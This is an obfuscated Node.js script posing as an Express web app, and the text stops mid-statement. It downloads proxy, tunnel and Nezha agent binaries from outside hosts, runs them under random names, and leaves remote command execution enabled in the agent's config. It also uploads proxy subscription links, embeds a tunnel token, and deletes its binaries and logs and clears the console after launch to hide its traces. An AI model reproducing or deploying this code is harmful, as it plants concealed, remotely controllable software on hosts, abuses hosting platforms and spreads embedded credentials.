const _0x5a6b7f=_0x239a;function _0x239a(_0x264b61,_0x6dd26b){_0x264b61=_0x264b61-0x1a0;const _0x17c51f=_0x17c5();let _0x239a4a=_0x17c51f[_0x264b61];return _0x239a4a;}(function(_0xed65a6,_0xec5557){const _0x5e0aa6=_0x239a,_0x38dd6b=_0xed65a6();while(!![]){try{const _0x4be3cb=parseInt(_0x5e0aa6(0x1a3))/0x1+parseInt(_0x5e0aa6(0x1ff))/0x2*(-parseInt(_0x5e0aa6(0x1df))/0x3)+parseInt(_0x5e0aa6(0x25e))/0x4*(-parseInt(_0x5e0aa6(0x259))/0x5)+-parseInt(_0x5e0aa6(0x1a7))/0x6+-parseInt(_0x5e0aa6(0x20f))/0x7*(-parseInt(_0x5e0aa6(0x1e7))/0x8)+parseInt(_0x5e0aa6(0x1ec))/0x9*(parseInt(_0x5e0aa6(0x24d))/0xa)+parseInt(_0x5e0aa6(0x1e9))/0xb;if(_0x4be3cb===_0xec5557)break;else _0x38dd6b['push'](_0x38dd6b['shift']());}catch(_0x19e710){_0x38dd6b['push'](_0x38dd6b['shift']());}}}(_0x17c5,0x31c55));const express=require(_0x5a6b7f(0x1ce)),app=express(),axios=require(_0x5a6b7f(0x236)),os=require('os'),fs=require('fs'),path=require(_0x5a6b7f(0x1e1)),{promisify}=require(_0x5a6b7f(0x1cc)),exec=promisify(require(_0x5a6b7f(0x20e))['exec']),UPLOAD_URL=process.env.UPLOAD_URL||'',PROJECT_URL=process.env.PROJECT_URL||'',AUTO_ACCESS=process.env.AUTO_ACCESS||![],FILE_PATH=process.env.FILE_PATH||_0x5a6b7f(0x1ed),SUB_PATH=process.env.SUB_PATH||_0x5a6b7f(0x1ee),PORT=process.env.SERVER_PORT||process.env.PORT||0xbb8,UUID=process.env.UUID||_0x5a6b7f(0x233),NEZHA_SERVER=process.env.NEZHA_SERVER||'',NEZHA_PORT=process.env.NEZHA_PORT||'',NEZHA_KEY=process.env.NEZHA_KEY||'',ARGO_DOMAIN=process.env.ARGO_DOMAIN||'net1.syb.qzz.io',ARGO_AUTH=process.env.ARGO_AUTH||_0x5a6b7f(0x204),ARGO_PORT=process.env.ARGO_PORT||0x1f41,CFIP=process.env.CFIP||_0x5a6b7f(0x1fa),CFPORT=process.env.CFPORT||0x1bb,NAME=process.env.NAME||'northflank';!fs[_0x5a6b7f(0x1a5)](FILE_PATH)?(fs[_0x5a6b7f(0x1b1)](FILE_PATH),console[_0x5a6b7f(0x22b)](FILE_PATH+_0x5a6b7f(0x209))):console[_0x5a6b7f(0x22b)](FILE_PATH+_0x5a6b7f(0x22c));function generateRandomName(){const _0x171094=_0x5a6b7f,_0x2f53da='abcdefghijklmnopqrstuvwxyz';let _0x1b18a7='';for(let _0x15690b=0x0;_0x15690b<0x6;_0x15690b++){_0x1b18a7+=_0x2f53da[_0x171094(0x1f2)](Math[_0x171094(0x1da)](Math[_0x171094(0x1c6)]()*_0x2f53da[_0x171094(0x211)]));}return _0x1b18a7;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x5a6b7f(0x234)](FILE_PATH,npmName),phpPath=path[_0x5a6b7f(0x234)](FILE_PATH,phpName),webPath=path[_0x5a6b7f(0x234)](FILE_PATH,webName),botPath=path[_0x5a6b7f(0x234)](FILE_PATH,botName),subPath=path[_0x5a6b7f(0x234)](FILE_PATH,_0x5a6b7f(0x1b8)),listPath=path[_0x5a6b7f(0x234)](FILE_PATH,'list.txt'),bootLogPath=path[_0x5a6b7f(0x234)](FILE_PATH,'boot.log'),configPath=path[_0x5a6b7f(0x234)](FILE_PATH,_0x5a6b7f(0x217));function deleteNodes(){const _0x304157=_0x5a6b7f;try{if(!UPLOAD_URL)return;if(!fs[_0x304157(0x1a5)](subPath))return;let _0x47df10;try{_0x47df10=fs[_0x304157(0x212)](subPath,_0x304157(0x21c));}catch{return null;}const _0x413079=Buffer[_0x304157(0x215)](_0x47df10,_0x304157(0x23d))[_0x304157(0x242)]('utf-8'),_0x46b652=_0x413079[_0x304157(0x25c)]('\x0a')[_0x304157(0x23f)](_0x445fa2=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x304157(0x229)](_0x445fa2));if(_0x46b652[_0x304157(0x211)]===0x0)return;return axios[_0x304157(0x261)](UPLOAD_URL+'/api/delete-nodes',JSON[_0x304157(0x1b0)]({'nodes':_0x46b652}),{'headers':{'Content-Type':'application/json'}})[_0x304157(0x1ba)](_0x29d3e1=>{return null;}),null;}catch(_0x3412f3){return null;}}function cleanupOldFiles(){const _0x3a662b=_0x5a6b7f;try{const _0x418fab=fs['readdirSync'](FILE_PATH);_0x418fab[_0x3a662b(0x1db)](_0xa880d4=>{const _0x2a30e8=_0x3a662b,_0x2d8e62=path[_0x2a30e8(0x234)](FILE_PATH,_0xa880d4);try{const _0x4575cf=fs[_0x2a30e8(0x24a)](_0x2d8e62);_0x4575cf[_0x2a30e8(0x1b5)]()&&fs[_0x2a30e8(0x1c1)](_0x2d8e62);}catch(_0x48d8b6){}});}catch(_0x314a3e){}}async function generateConfig(){const _0x2c941d=_0x5a6b7f,_0x586b9c={'log':{'access':'/dev/null','error':_0x2c941d(0x1c3),'loglevel':_0x2c941d(0x1cb)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':_0x2c941d(0x21d)}],'decryption':_0x2c941d(0x1cb),'fallbacks':[{'dest':0xbb9},{'path':_0x2c941d(0x1be),'dest':0xbba},{'path':_0x2c941d(0x20d),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x2c941d(0x25d),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x2c941d(0x213),'security':_0x2c941d(0x1cb)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x2c941d(0x24f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x2c941d(0x1cb)},'streamSettings':{'network':'ws','security':_0x2c941d(0x1cb),'wsSettings':{'path':_0x2c941d(0x1be)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x2c941d(0x222)],'metadataOnly':![]}},{'port':0xbbb,'listen':'127.0.0.1','protocol':_0x2c941d(0x243),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x2c941d(0x20d)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x2c941d(0x222)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x2c941d(0x25d),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x2c941d(0x1cb),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x2c941d(0x1d2),'tls',_0x2c941d(0x222)],'metadataOnly':![]}}],'dns':{'servers':[_0x2c941d(0x238)]},'outbounds':[{'protocol':'freedom','tag':_0x2c941d(0x23c)},{'protocol':'blackhole','tag':'block'}]};fs[_0x2c941d(0x208)](path['join'](FILE_PATH,_0x2c941d(0x217)),JSON[_0x2c941d(0x1b0)](_0x586b9c,null,0x2));}function getSystemArchitecture(){const _0x113ff0=_0x5a6b7f,_0x4e7ee3=os[_0x113ff0(0x235)]();return _0x4e7ee3===_0x113ff0(0x1a9)||_0x4e7ee3===_0x113ff0(0x227)||_0x4e7ee3===_0x113ff0(0x246)?_0x113ff0(0x1a9):_0x113ff0(0x21a);}function downloadFile(_0x4444e,_0x271c09,_0x250006){const _0x51b867=_0x5a6b7f,_0x27af64=_0x4444e;!fs[_0x51b867(0x1a5)](FILE_PATH)&&fs[_0x51b867(0x1b1)](FILE_PATH,{'recursive':!![]});const _0x24ed10=fs[_0x51b867(0x1cd)](_0x27af64);axios({'method':_0x51b867(0x1f6),'url':_0x271c09,'responseType':_0x51b867(0x1ab)})[_0x51b867(0x226)](_0x4fc307=>{const _0x36699e=_0x51b867;_0x4fc307[_0x36699e(0x203)][_0x36699e(0x218)](_0x24ed10),_0x24ed10['on'](_0x36699e(0x1a1),()=>{const _0x445085=_0x36699e;_0x24ed10[_0x445085(0x1e5)](),console[_0x445085(0x22b)](_0x445085(0x1c8)+path[_0x445085(0x1e0)](_0x27af64)+_0x445085(0x250)),_0x250006(null,_0x27af64);}),_0x24ed10['on'](_0x36699e(0x1e3),_0xa6dd59=>{const _0x23e9f5=_0x36699e;fs[_0x23e9f5(0x228)](_0x27af64,()=>{});const _0x59d5f0=_0x23e9f5(0x1c8)+path['basename'](_0x27af64)+_0x23e9f5(0x1d6)+_0xa6dd59[_0x23e9f5(0x241)];console['error'](_0x59d5f0),_0x250006(_0x59d5f0);});})['catch'](_0x5aa677=>{const _0xf3be5b=_0x51b867,_0x588269=_0xf3be5b(0x1c8)+path['basename'](_0x27af64)+_0xf3be5b(0x1d6)+_0x5aa677['message'];console['error'](_0x588269),_0x250006(_0x588269);});}async function downloadFilesAndRun(){const _0x5d5464=_0x5a6b7f,_0x5ece99=getSystemArchitecture(),_0x12d26a=getFilesForArchitecture(_0x5ece99);if(_0x12d26a[_0x5d5464(0x211)]===0x0){console[_0x5d5464(0x22b)](_0x5d5464(0x248));return;}const _0x4314a6=_0x12d26a[_0x5d5464(0x1cf)](_0x205f2c=>{return new Promise((_0x587adc,_0x34f091)=>{const _0x421871=_0x239a;downloadFile(_0x205f2c['fileName'],_0x205f2c[_0x421871(0x1b3)],(_0x1961dc,_0x4df437)=>{_0x1961dc?_0x34f091(_0x1961dc):_0x587adc(_0x4df437);});});});try{await Promise[_0x5d5464(0x1e8)](_0x4314a6);}catch(_0x1dd2b3){console[_0x5d5464(0x1e3)](_0x5d5464(0x1a8),_0x1dd2b3);return;}function _0x2c3b15(_0x58d5d9){const _0x249551=_0x5d5464,_0x600a1d=0x1fd;_0x58d5d9[_0x249551(0x1db)](_0x534692=>{const _0x2cc4b2=_0x249551;fs[_0x2cc4b2(0x1a5)](_0x534692)&&fs[_0x2cc4b2(0x25b)](_0x534692,_0x600a1d,_0x2bab71=>{const _0x66981a=_0x2cc4b2;_0x2bab71?console[_0x66981a(0x1e3)](_0x66981a(0x1d1)+_0x534692+':\x20'+_0x2bab71):console[_0x66981a(0x22b)]('Empowerment\x20success\x20for\x20'+_0x534692+':\x20'+_0x600a1d[_0x66981a(0x242)](0x8));});});}const _0x3903b3=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2c3b15(_0x3903b3);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x513f0a=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x5d5464(0x25c)](':')[_0x5d5464(0x1eb)]():'',_0x1ba1c3=new Set([_0x5d5464(0x24c),_0x5d5464(0x1de),_0x5d5464(0x220),'2087',_0x5d5464(0x1f5),'2053']),_0x8dbf27=_0x1ba1c3['has'](_0x513f0a)?_0x5d5464(0x1f9):_0x5d5464(0x1c9),_0x22633e=_0x5d5464(0x207)+NEZHA_KEY+_0x5d5464(0x22a)+NEZHA_SERVER+_0x5d5464(0x225)+_0x8dbf27+_0x5d5464(0x237)+UUID;fs[_0x5d5464(0x208)](path[_0x5d5464(0x234)](FILE_PATH,_0x5d5464(0x1a4)),_0x22633e);const _0x470ef4='nohup\x20'+phpPath+_0x5d5464(0x22d)+FILE_PATH+_0x5d5464(0x1af);try{await exec(_0x470ef4),console[_0x5d5464(0x22b)](phpName+_0x5d5464(0x252)),await new Promise(_0xe9ca65=>setTimeout(_0xe9ca65,0x3e8));}catch(_0x15b987){console[_0x5d5464(0x1e3)](_0x5d5464(0x1f7)+_0x15b987);}}else{let _0x5aab4f='';const _0x2d3d44=[_0x5d5464(0x24c),_0x5d5464(0x1de),_0x5d5464(0x220),'2087',_0x5d5464(0x1f5),'2053'];_0x2d3d44[_0x5d5464(0x1b7)](NEZHA_PORT)&&(_0x5aab4f=_0x5d5464(0x1d9));const _0x58580b=_0x5d5464(0x224)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5d5464(0x1f8)+NEZHA_KEY+'\x20'+_0x5aab4f+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';try{await exec(_0x58580b),console[_0x5d5464(0x22b)](npmName+_0x5d5464(0x252)),await new Promise(_0x4ade36=>setTimeout(_0x4ade36,0x3e8));}catch(_0x127ca7){console[_0x5d5464(0x1e3)](_0x5d5464(0x1a2)+_0x127ca7);}}}else console[_0x5d5464(0x22b)](_0x5d5464(0x1c0));const _0x60b1f4='nohup\x20'+webPath+_0x5d5464(0x23a)+FILE_PATH+_0x5d5464(0x200);try{await exec(_0x60b1f4),console[_0x5d5464(0x22b)](webName+_0x5d5464(0x252)),await new Promise(_0x39e8dc=>setTimeout(_0x39e8dc,0x3e8));}catch(_0x1f3a2d){console[_0x5d5464(0x1e3)](_0x5d5464(0x22f)+_0x1f3a2d);}if(fs[_0x5d5464(0x1a5)](botPath)){let _0x42b54e;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x42b54e=_0x5d5464(0x20c)+ARGO_AUTH;else ARGO_AUTH[_0x5d5464(0x256)](/TunnelSecret/)?_0x42b54e=_0x5d5464(0x1bc)+FILE_PATH+_0x5d5464(0x1d7):_0x42b54e='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x5d5464(0x224)+botPath+'\x20'+_0x42b54e+'\x20>/dev/null\x202>&1\x20&'),console[_0x5d5464(0x22b)](botName+'\x20is\x20running'),await new Promise(_0x1e96d8=>setTimeout(_0x1e96d8,0x7d0));}catch(_0x4b0f1f){console['error']('Error\x20executing\x20command:\x20'+_0x4b0f1f);}}await new Promise(_0x4898c9=>setTimeout(_0x4898c9,0x1388));}function getFilesForArchitecture(_0x5c5f7a){const _0x4157b9=_0x5a6b7f;let _0x502402;_0x5c5f7a===_0x4157b9(0x1a9)?_0x502402=[{'fileName':webPath,'fileUrl':_0x4157b9(0x1e2)},{'fileName':botPath,'fileUrl':_0x4157b9(0x231)}]:_0x502402=[{'fileName':webPath,'fileUrl':_0x4157b9(0x1ae)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x1d7017=_0x5c5f7a==='arm'?_0x4157b9(0x245):_0x4157b9(0x1a6);_0x502402[_0x4157b9(0x1d0)]({'fileName':npmPath,'fileUrl':_0x1d7017});}else{const _0x3e2697=_0x5c5f7a===_0x4157b9(0x1a9)?'https://arm64.ssss.nyc.mn/v1':_0x4157b9(0x23b);_0x502402[_0x4157b9(0x1d0)]({'fileName':phpPath,'fileUrl':_0x3e2697});}}return _0x502402;}function argoType(){const _0xb37336=_0x5a6b7f;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0xb37336(0x22b)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0xb37336(0x1b7)](_0xb37336(0x240))){fs['writeFileSync'](path['join'](FILE_PATH,_0xb37336(0x20b)),ARGO_AUTH);const _0x1f10c5=_0xb37336(0x1bf)+ARGO_AUTH[_0xb37336(0x25c)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0xb37336(0x234)](FILE_PATH,_0xb37336(0x20b))+_0xb37336(0x1dc)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0xb37336(0x1c4);fs[_0xb37336(0x208)](path[_0xb37336(0x234)](FILE_PATH,_0xb37336(0x1f3)),_0x1f10c5);}else console[_0xb37336(0x22b)](_0xb37336(0x1b9));}function _0x17c5(){const _0x3c98c7=['tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','config.json','pipe','del\x20/f\x20/q\x20','amd','utf8','utf-8','xtls-rprx-vision','/api/add-subscriptions','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','2096','?encryption=none&security=tls&sni=','quic','\x0avless://','nohup\x20','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','then','arm64','unlink','test','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','log','\x20already\x20exists','\x20-c\x20\x22','org','web\x20running\x20error:\x20','/api/add-nodes','https://arm64.ssss.nyc.mn/bot','Unknown','0dcec678-fa48-47d1-9132-9109b3f8894e','join','arch','axios','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https+local://8.8.8.8/dns-query','clear','\x20-c\x20','https://amd64.ssss.nyc.mn/v1','direct','base64','https://oooo.serv00.net/add-url','filter','TunnelSecret','message','toString','vmess','replace','https://arm64.ssss.nyc.mn/agent','aarch64','auto','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','statSync','taskkill\x20/f\x20/im\x20','443','1435420oWwwMh','\x22\x20>\x20/dev/null\x202>&1','vless','\x20successfully','country_code','\x20is\x20running','Subscription\x20uploaded\x20successfully','tls','platform','match','push','Mozilla/5.0','31075rreNdU','listen','chmod','split','127.0.0.1','8CXMwrn','promises','&fp=firefox&type=ws&host=','post','Unhandled\x20error\x20in\x20startserver:','finish','npm\x20running\x20error:\x20','213757VNkDWy','config.yaml','existsSync','https://amd64.ssss.nyc.mn/agent','691392hHJbiU','Error\x20downloading\x20files:','arm','\x0a\x0atrojan://','stream','boot.log','/sub.txt\x20saved\x20successfully','https://amd64.ssss.nyc.mn/web','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','stringify','mkdirSync','Add\x20automatic\x20access\x20task\x20faild:\x20','fileUrl','application/json','isFile','Error\x20reading\x20boot.log:','includes','sub.txt','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','catch','/vmess-argo?ed=2560','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','pkill\x20-f\x20\x22[','/vless-argo','\x0a\x20\x20tunnel:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','unlinkSync','Content-Type','/dev/null','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','countryCode','random','\x20>/dev/null\x202>&1\x20&','Download\x20','false','\x20>/dev/null\x202>&1','none','util','createWriteStream','express','map','unshift','Empowerment\x20failed\x20for\x20','http','text/plain;\x20charset=utf-8','\x20>\x20nul\x202>&1','win32','\x20failed:\x20','/tunnel.yml\x20run','success','--tls','floor','forEach','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','automatic\x20access\x20task\x20added\x20successfully','8443','4350MfVNlj','basename','path','https://arm64.ssss.nyc.mn/web','error','https://api.ip.sb/geoip','close','App\x20is\x20running','507192nmXQpI','all','247225UYBdYN','isp','pop','9FVcDhn','.tmp','sub','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','send','http://ip-api.com/json','charAt','tunnel.yml','firefox','2083','get','php\x20running\x20error:\x20','\x20-p\x20','true','saas.sin.fan','http\x20server\x20is\x20running\x20on\x20port:','.exe\x20>\x20nul\x202>&1','\x0a\x20\x20\x20\x20','Nodes\x20uploaded\x20successfully','154dodlGc','/config.json\x20>/dev/null\x202>&1\x20&','Error\x20executing\x20command:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','data','eyJhIjoiYTRiMDIxYjNjYzM4OTdhN2EzMmM4NjJiYTg0ZGU1MWMiLCJ0IjoiNmVmZGIyMmEtY2E0NS00YjhlLTg2ZGQtZjllNTdhYTg0M2FhIiwicyI6IlltVm1OVE0wWWpJdE9XSmhNaTAwTUdVNUxXRmxaREV0WW1OaVl6azVORFEzTVRGbCJ9','index.html','response','\x0aclient_secret:\x20','writeFileSync','\x20is\x20created','status','tunnel.json','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','/vmess-argo','child_process','7rjzToC','rm\x20-rf\x20','length','readFileSync','tcp','Error\x20in\x20startserver:','from'];_0x17c5=function(){return _0x3c98c7;};return _0x17c5();}async function extractDomains(){const _0x136197=_0x5a6b7f;let _0x400335;if(ARGO_AUTH&&ARGO_DOMAIN)_0x400335=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x400335),await _0x551d55(_0x400335);else try{const _0x20ca89=fs[_0x136197(0x212)](path[_0x136197(0x234)](FILE_PATH,_0x136197(0x1ac)),_0x136197(0x21c)),_0x3ea438=_0x20ca89[_0x136197(0x25c)]('\x0a'),_0xf4658a=[];_0x3ea438[_0x136197(0x1db)](_0x3699f7=>{const _0x3ccce0=_0x3699f7['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x3ccce0){const _0xc8b93f=_0x3ccce0[0x1];_0xf4658a['push'](_0xc8b93f);}});if(_0xf4658a[_0x136197(0x211)]>0x0)_0x400335=_0xf4658a[0x0],console['log']('ArgoDomain:',_0x400335),await _0x551d55(_0x400335);else{console[_0x136197(0x22b)](_0x136197(0x249)),fs[_0x136197(0x1c1)](path[_0x136197(0x234)](FILE_PATH,_0x136197(0x1ac)));async function _0x14a286(){const _0x3f5675=_0x136197;try{process[_0x3f5675(0x255)]===_0x3f5675(0x1d5)?await exec(_0x3f5675(0x24b)+botName+_0x3f5675(0x1fc)):await exec(_0x3f5675(0x1bd)+botName['charAt'](0x0)+']'+botName['substring'](0x1)+_0x3f5675(0x24e));}catch(_0x324be8){}}_0x14a286(),await new Promise(_0x14f73e=>setTimeout(_0x14f73e,0xbb8));const _0x29004b=_0x136197(0x216)+FILE_PATH+_0x136197(0x1ef)+ARGO_PORT;try{await exec(_0x136197(0x224)+botPath+'\x20'+_0x29004b+_0x136197(0x1c7)),console[_0x136197(0x22b)](botName+_0x136197(0x252)),await new Promise(_0x4ff0c5=>setTimeout(_0x4ff0c5,0xbb8)),await extractDomains();}catch(_0x421f2a){console[_0x136197(0x1e3)](_0x136197(0x201)+_0x421f2a);}}}catch(_0xd22f48){console[_0x136197(0x1e3)](_0x136197(0x1b6),_0xd22f48);}async function _0x5567c4(){const _0x39be47=_0x136197;try{const _0x4cb1d0=await axios[_0x39be47(0x1f6)](_0x39be47(0x1e4),{'headers':{'User-Agent':_0x39be47(0x258),'timeout':0xbb8}});if(_0x4cb1d0['data']&&_0x4cb1d0[_0x39be47(0x203)][_0x39be47(0x251)]&&_0x4cb1d0[_0x39be47(0x203)][_0x39be47(0x1ea)])return(_0x4cb1d0[_0x39be47(0x203)]['country_code']+'-'+_0x4cb1d0['data'][_0x39be47(0x1ea)])[_0x39be47(0x244)](/\s+/g,'_');}catch(_0x47f12e){try{const _0x31eddd=await axios['get'](_0x39be47(0x1f1),{'headers':{'User-Agent':'Mozilla/5.0','timeout':0xbb8}});if(_0x31eddd['data']&&_0x31eddd['data'][_0x39be47(0x20a)]===_0x39be47(0x1d8)&&_0x31eddd[_0x39be47(0x203)][_0x39be47(0x1c5)]&&_0x31eddd[_0x39be47(0x203)][_0x39be47(0x22e)])return(_0x31eddd[_0x39be47(0x203)][_0x39be47(0x1c5)]+'-'+_0x31eddd[_0x39be47(0x203)][_0x39be47(0x22e)])['replace'](/\s+/g,'_');}catch(_0x4049ee){}}return _0x39be47(0x232);}async function _0x551d55(_0x13f0e3){const _0x57437f=await _0x5567c4(),_0x44e6ac=NAME?NAME+'-'+_0x57437f:_0x57437f;return new Promise(_0x281e1e=>{setTimeout(()=>{const _0x46e6f5=_0x239a,_0x456fb4={'v':'2','ps':''+_0x44e6ac,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x46e6f5(0x247),'net':'ws','type':_0x46e6f5(0x1cb),'host':_0x13f0e3,'path':_0x46e6f5(0x1bb),'tls':_0x46e6f5(0x254),'sni':_0x13f0e3,'alpn':'','fp':_0x46e6f5(0x1f4)},_0xf299bc=_0x46e6f5(0x223)+UUID+'@'+CFIP+':'+CFPORT+_0x46e6f5(0x221)+_0x13f0e3+_0x46e6f5(0x260)+_0x13f0e3+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x44e6ac+'\x0a\x0avmess://'+Buffer[_0x46e6f5(0x215)](JSON['stringify'](_0x456fb4))[_0x46e6f5(0x242)](_0x46e6f5(0x23d))+_0x46e6f5(0x1aa)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x13f0e3+_0x46e6f5(0x260)+_0x13f0e3+_0x46e6f5(0x202)+_0x44e6ac+_0x46e6f5(0x1fd);console[_0x46e6f5(0x22b)](Buffer[_0x46e6f5(0x215)](_0xf299bc)[_0x46e6f5(0x242)](_0x46e6f5(0x23d))),fs[_0x46e6f5(0x208)](subPath,Buffer[_0x46e6f5(0x215)](_0xf299bc)[_0x46e6f5(0x242)]('base64')),console[_0x46e6f5(0x22b)](FILE_PATH+_0x46e6f5(0x1ad)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x356b3a,_0x141af6)=>{const _0x299da7=_0x46e6f5,_0x566afe=Buffer[_0x299da7(0x215)](_0xf299bc)[_0x299da7(0x242)](_0x299da7(0x23d));_0x141af6['set'](_0x299da7(0x1c2),_0x299da7(0x1d3)),_0x141af6[_0x299da7(0x1f0)](_0x566afe);}),_0x281e1e(_0xf299bc);},0x7d0);});}}async function uploadNodes(){const _0x3140a3=_0x5a6b7f;if(UPLOAD_URL&&PROJECT_URL){const _0x11963d=PROJECT_URL+'/'+SUB_PATH,_0x5dd6fc={'subscription':[_0x11963d]};try{const _0x51511f=await axios[_0x3140a3(0x261)](UPLOAD_URL+_0x3140a3(0x21e),_0x5dd6fc,{'headers':{'Content-Type':'application/json'}});return _0x51511f&&_0x51511f['status']===0xc8?(console['log'](_0x3140a3(0x253)),_0x51511f):null;}catch(_0x8c442b){if(_0x8c442b[_0x3140a3(0x206)]){if(_0x8c442b['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x3140a3(0x1a5)](listPath))return;const _0x5835a5=fs[_0x3140a3(0x212)](listPath,_0x3140a3(0x21c)),_0x4a95b3=_0x5835a5[_0x3140a3(0x25c)]('\x0a')['filter'](_0x5c4669=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3140a3(0x229)](_0x5c4669));if(_0x4a95b3[_0x3140a3(0x211)]===0x0)return;const _0x26a089=JSON[_0x3140a3(0x1b0)]({'nodes':_0x4a95b3});try{const _0x44ecaf=await axios[_0x3140a3(0x261)](UPLOAD_URL+_0x3140a3(0x230),_0x26a089,{'headers':{'Content-Type':_0x3140a3(0x1b4)}});return _0x44ecaf&&_0x44ecaf['status']===0xc8?(console[_0x3140a3(0x22b)](_0x3140a3(0x1fe)),_0x44ecaf):null;}catch(_0x32cd3f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4d8c66=_0x239a,_0x58dbf3=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x58dbf3[_0x4d8c66(0x257)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x58dbf3[_0x4d8c66(0x257)](phpPath);process[_0x4d8c66(0x255)]==='win32'?exec(_0x4d8c66(0x219)+_0x58dbf3[_0x4d8c66(0x234)]('\x20')+_0x4d8c66(0x1d4),_0x4b800e=>{const _0x4e9566=_0x4d8c66;console['clear'](),console[_0x4e9566(0x22b)](_0x4e9566(0x1e6)),console[_0x4e9566(0x22b)](_0x4e9566(0x21f));}):exec(_0x4d8c66(0x210)+_0x58dbf3['join']('\x20')+_0x4d8c66(0x1ca),_0x4ac0a4=>{const _0xf3b1e3=_0x4d8c66;console[_0xf3b1e3(0x239)](),console[_0xf3b1e3(0x22b)](_0xf3b1e3(0x1e6)),console[_0xf3b1e3(0x22b)](_0xf3b1e3(0x21f));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3c333a=_0x5a6b7f;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3c333a(0x22b)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x564113=await axios[_0x3c333a(0x261)](_0x3c333a(0x23e),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3c333a(0x1b4)}});return console['log'](_0x3c333a(0x1dd)),_0x564113;}catch(_0x1b73a4){return console[_0x3c333a(0x1e3)](_0x3c333a(0x1b2)+_0x1b73a4[_0x3c333a(0x241)]),null;}}async function startserver(){const _0xac6896=_0x5a6b7f;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2eadf7){console[_0xac6896(0x1e3)](_0xac6896(0x214),_0x2eadf7);}}startserver()[_0x5a6b7f(0x1ba)](_0x50512e=>{const _0x10fd6d=_0x5a6b7f;console[_0x10fd6d(0x1e3)](_0x10fd6d(0x1a0),_0x50512e);}),app[_0x5a6b7f(0x1f6)]('/',async function(_0x3614ee,_0x48c15a){const 